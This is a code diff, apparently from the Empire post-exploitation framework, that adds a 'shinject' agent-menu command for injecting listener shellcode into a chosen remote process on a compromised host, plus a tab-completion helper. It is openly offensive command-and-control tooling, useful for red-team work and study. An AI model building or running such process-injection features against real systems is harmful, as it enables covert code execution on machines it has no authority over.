@@ -2127,6 +2127,37 @@ class PowerShellAgentMenu(SubMenu):
             print helpers.color("[!] Injection requires you to specify listener")
 
 
+    def do_shinject(self, line):
+        "Inject non-meterpreter listener shellcode into a remote process. Ex. shinject <listener> <pid>"
+
+        if line:
+            if self.mainMenu.modules.modules['powershell/management/shinject']:
+                module = self.mainMenu.modules.modules['powershell/management/shinject']
+                listenerID = line.split(' ')[0].strip()
+                arch = line.split(' ')[-1]
+                module.options['Listener']['Value'] = listenerID
+                module.options['Arch']['Value'] = arch
+
+                if listenerID != '' and self.mainMenu.listeners.is_listener_valid(listenerID):
+                    if len(line.split(' ')) == 3:
+                        target = line.split(' ')[1].strip()
+                        if target.isdigit():
+                            module.options['ProcId']['Value'] = target
+                        else:
+                            print helpers.color('[!] Please enter a valid process ID.')
+
+                    module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
+                    module_menu = ModuleMenu(self.mainMenu, 'powershell/management/shinject')
+                    module_menu.do_execute("")
+                else:
+                    print helpers.color('[!] Please select a valid listener')
+            
+            else:
+                print helpers.color("[!] powershell/management/psinject module not loaded")
+        
+        else:
+            print helpers.color("[!] Injection requires you to specify listener")
+
     def do_injectshellcode(self, line):
         "Inject listener shellcode into a remote process. Ex. injectshellcode <meter_listener> <pid>"
 
@@ -2346,6 +2377,11 @@ class PowerShellAgentMenu(SubMenu):
         "Display/return credentials from the database."
         self.mainMenu.do_creds(line)
 
+
+    def complete_shinject(self, text, line, begidx, endidx):
+        "Tab-complete psinject option values."
+
+        return self.complete_psinject(text, line, begidx, endidx)
 
     def complete_psinject(self, text, line, begidx, endidx):
         "Tab-complete psinject option values."
